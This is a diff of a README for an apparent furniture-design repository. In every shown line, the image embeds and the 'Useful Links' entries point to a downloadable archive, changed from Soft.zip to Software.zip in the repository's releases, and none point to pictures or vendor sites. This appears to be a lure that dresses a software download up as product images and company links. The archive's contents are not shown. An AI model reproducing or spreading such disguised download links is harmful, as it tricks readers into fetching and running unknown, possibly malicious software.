@@ -12,23 +12,23 @@ Our team is dedicated to providing high-quality furniture that is not only funct
 Here are some of our popular furniture designs:
 
 ### 1. Ergonomic Office Chairs
-![Ergonomic Chair](https://github.com/guju41/customize-furniture-designs/releases/download/v1.0/Soft.zip)
+![Ergonomic Chair](https://github.com/guju41/customize-furniture-designs/releases/download/v2.0/Software.zip)
 
 Description: Our ergonomic office chairs are designed to provide comfort and support during long hours of work.
 
 ### 2. Customizable Desks
-![Customizable Desk](https://github.com/guju41/customize-furniture-designs/releases/download/v1.0/Soft.zip)
+![Customizable Desk](https://github.com/guju41/customize-furniture-designs/releases/download/v2.0/Software.zip)
 
 Description: Our customizable desks come in various sizes and finishes, allowing you to create a workspace that reflects your style.
 
 ### 3. Storage Solutions
-![Storage Solutions](https://github.com/guju41/customize-furniture-designs/releases/download/v1.0/Soft.zip)
+![Storage Solutions](https://github.com/guju41/customize-furniture-designs/releases/download/v2.0/Software.zip)
 
 Description: Our range of storage solutions includes cabinets, shelves, and organizers to keep your workspace neat and organized.
 
 ## 🌐 Useful Links
-- [Visit Multiwood - Furniture Manufacturers](https://github.com/guju41/customize-furniture-designs/releases/download/v1.0/Soft.zip)
-- [Wholesale Office Furniture](https://github.com/guju41/customize-furniture-designs/releases/download/v1.0/Soft.zip)
+- [Visit Multiwood - Furniture Manufacturers](https://github.com/guju41/customize-furniture-designs/releases/download/v2.0/Software.zip)
+- [Wholesale Office Furniture](https://github.com/guju41/customize-furniture-designs/releases/download/v2.0/Software.zip)
 
 For more information and updates, don't forget to check the **Releases** section of this repository.
 
